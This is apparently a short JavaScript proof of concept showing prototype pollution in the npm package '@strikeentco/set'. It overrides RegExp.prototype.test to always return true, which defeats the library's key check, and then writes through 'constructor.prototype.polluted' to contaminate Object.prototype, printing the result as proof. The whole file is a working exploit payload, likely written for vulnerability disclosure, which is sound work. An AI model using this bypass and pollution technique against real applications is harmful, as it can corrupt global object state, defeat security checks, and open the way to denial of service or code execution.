RegExp.prototype.test = () => true;
const sset = require('@strikeentco/set');
var obj = {};
console.log({}.polluted);
sset(obj, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');